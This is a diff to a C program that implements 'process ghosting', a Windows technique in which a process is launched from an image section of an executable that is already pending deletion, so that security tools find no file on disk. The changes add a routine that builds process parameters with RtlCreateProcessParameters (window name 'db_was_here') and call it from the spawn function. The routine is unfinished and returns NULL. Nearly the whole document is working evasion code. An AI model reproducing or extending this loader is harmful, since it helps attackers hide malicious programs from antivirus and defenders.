@@ -4,9 +4,11 @@
 #include <stdint.h>
 #include <stdlib.h>
 #include <windows.h>
+#include <userenv.h>
 #include "ghosted.h"
 
 #pragma comment(lib, "ntdll")
+#pragma comment(lib, "userenv")
 
 // Store child process info
 typedef struct _CP_INFO {
@@ -252,7 +254,7 @@ HANDLE fetch_sections(HANDLE hfile, unsigned char * f_bytes, DWORD f_size) {
 	return hsection;
 }
 
-// Create Child process, gquey it and return a handle 
+// Create Child process, query it and return a handle 
 PCP_INFO create_cp(HANDLE hsection) {
 	NTSTATUS _status;
 	DWORD retlen = 0;
@@ -302,12 +304,97 @@ PCP_INFO create_cp(HANDLE hsection) {
 	return p_info;
 }
 
+// Set Environment Veriable
+LPVOID set_env(PCP_INFO p_info, LPWSTR w_target_name) {
+	DWORD ret_len = 0;
+	LPVOID env, param;
+	PEB peb_copy = { 0 };
+	UNICODE_STRING u_tpath = { 0 };
+	UNICODE_STRING u_dll_dir = { 0 };
+	UNICODE_STRING u_curr_dir = { 0 };
+	wchar_t w_dir_path[MAX_PATH] = { 0 };
+	UNICODE_STRING u_window_name = { 0 };
+	PRTL_USER_PROCESS_PARAMETERS proc_params = NULL;
+
+	NTSTATUS _status;
+	_status = NtQueryInformationProcess(
+		p_info->p_handle, 
+		ProcessBasicInformation, 
+		&(p_info->pb_info), 
+		sizeof(PROCESS_BASIC_INFORMATION), 
+		&ret_len);
+
+	if (!__check_nt_status(_status, "NtQueryInformationProcess()")) {
+		
+		return NULL;
+	}
+
+	// Copy Target Paths
+	_status = RtlInitUnicodeString(&u_tpath, w_target_name);
+	if (!__check_nt_status(_status, "RtlInitUnicodeString()")) {
+		return NULL;
+	}
+	
+	// Copy Target Paths
+	_status = RtlInitUnicodeString(&u_tpath, w_target_name);
+	if (!__check_nt_status(_status, "RtlInitUnicodeString()")) {
+		return NULL;
+	}
+	
+	// Get Current Directory as Wide Chars
+	if ((GetCurrentDirectoryW(MAX_PATH, w_dir_path)) == 0 ) {
+		fprintf(stderr, "[!] Failed to fetch Current Directory (0x%x)\n", GetLastError());
+		return NULL;
+	}
+	printf("> Current Directory: %S\n", w_dir_path);
+
+	// Copy Current Directory into UNICODE_STRING
+	_status = RtlInitUnicodeString(&u_curr_dir, w_dir_path);
+	if (!__check_nt_status(_status, "RtlInitUnicodeString()")) {
+		return NULL;
+	}
+
+	// Copy DLL Path
+	_status = RtlInitUnicodeString(&u_dll_dir, L"C:\\Windows\\System32");
+	if (!__check_nt_status(_status, "RtlInitUnicodeString()")) {
+		return NULL;
+	}
+
+	// Name of Window
+	_status = RtlInitUnicodeString(&u_window_name, L"db_was_here");
+	if (!__check_nt_status(_status, "RtlInitUnicodeString()")) {
+		return NULL;
+	}
+
+	// Set Environment
+	env = NULL;
+	if (!CreateEnvironmentBlock(&env, NULL, TRUE)) {
+		fprintf(stderr, "[!] CreateEnvironmentBlock() failed (0x%x)\n", GetLastError());
+		return NULL;
+	}
+
+	_status = RtlCreateProcessParameters(
+			&proc_params, 
+			(PUNICODE_STRING)&u_tpath, 
+			(PUNICODE_STRING)&u_dll_dir,
+			(PUNICODE_STRING)&u_curr_dir, 
+			(PUNICODE_STRING)&u_tpath, 
+			env, 
+			(PUNICODE_STRING)&u_window_name,
+			NULL, NULL, NULL);
+
+	if (!__check_nt_status(_status, "RtlCreateProcessParameters()")) {
+		return NULL;
+	}
+
+	return NULL;
+}
+
 // Spawn a process using ghosting
 int spawn_process(char* real_exe, char* fake_exe) {
 	DWORD f_size;
 	HANDLE hfakefile, hsection;
 	LPVOID base_addr;
-	DWORD entry_point_addr;
 	PCP_INFO p_info;
 
 	// Create fake executable and put it in delete-pending state
@@ -357,6 +444,29 @@ int spawn_process(char* real_exe, char* fake_exe) {
 		return -6;
 	}
 
+	printf("==== Assigning Env and CL Arguments ====\n");
+
+	wchar_t * w_fname = (wchar_t*)malloc((strlen(fake_exe) + 1) * 2);
+	if (w_fname == NULL) {
+		fprintf(stderr, "[!] Failed to allocate memory for Wide File Name\n");
+		CloseHandle(p_info->p_handle);
+		CloseHandle(hsection);
+		return -7;
+	}
+
+	RtlZeroMemory(w_fname, _msize(w_fname));
+
+	if ((MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, fake_exe, -1, w_fname, _msize(w_fname))) == 0) {
+		fprintf(stderr, "[!] MultiByteToWideChar() failed\n");
+		free(w_fname);
+		CloseHandle(p_info->p_handle);
+		CloseHandle(hsection);
+		return -8;
+	}
+		
+	set_env(p_info, w_fname);
+
+	free(w_fname);
 	CloseHandle(p_info->p_handle);
 	CloseHandle(hsection);
 	return 0;
